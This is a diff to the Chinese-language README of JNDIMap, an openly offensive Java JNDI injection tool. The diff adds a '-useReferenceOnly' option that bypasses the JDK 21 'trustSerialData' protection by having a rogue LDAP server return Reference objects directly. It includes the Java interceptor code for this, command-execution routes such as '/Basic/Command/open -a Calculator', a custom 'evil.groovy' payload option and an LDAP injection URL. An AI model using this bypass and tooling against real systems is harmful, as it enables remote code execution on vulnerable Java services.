@@ -30,7 +30,7 @@ mvn package -Dmaven.test.skip=true
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-useReferenceOnly] [-h]
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -44,6 +44,8 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 `-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)
 
 `-f`: Groovy 脚本路径, 用于编写自定义 JNDI Payload
+
+`-useReferenceOnly`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`
 
 `-h`: 显示 Usage 信息
 
@@ -315,7 +317,7 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 ### Deserialize
 
-即 LDAP 反序列化, 不支持 RMI 协议
+通过 LDAP 协议触发 Java 原生反序列化, 不支持 RMI 协议
 
 JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
 
@@ -419,6 +421,44 @@ java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
 
 ```bash
 ldap://127.0.0.1:1389/x
+```
+
+### useReferenceOnly
+
+对于 LDAP 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
+
+但是自 JDK 21 开始 `com.sun.jndi.ldap.object.trustSerialData` 参数默认为 false, 即无法通过 LDAP 协议触发反序列化, 也就无法通过上面的方法解析 Reference 对象
+
+不过我们仍然可以设置相关的 LDAP 参数, 使得服务端直接返回 Reference 对象, 因为这个过程没有涉及到反序列化, 所以也就绕过了 trustSerialData 参数的限制
+
+具体实现如下
+
+```java
+public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
+    // ......
+
+    Reference ref = (Reference) result;
+    e.addAttribute("objectClass", "javaNamingReference");
+    e.addAttribute("javaClassName", ref.getClassName());
+    e.addAttribute("javaFactory", ref.getFactoryClassName());
+
+    Enumeration<RefAddr> enumeration = ref.getAll();
+    int posn = 0;
+
+    while (enumeration.hasMoreElements()) {
+        StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
+        e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
+        posn ++;
+    }
+    
+    // ......
+}
+```
+
+使用时指定 `-useReferenceOnly` 参数即可
+
+```bash
+java -jar JNDIMap.jar -useReferenceOnly
 ```
 
 ## Reference
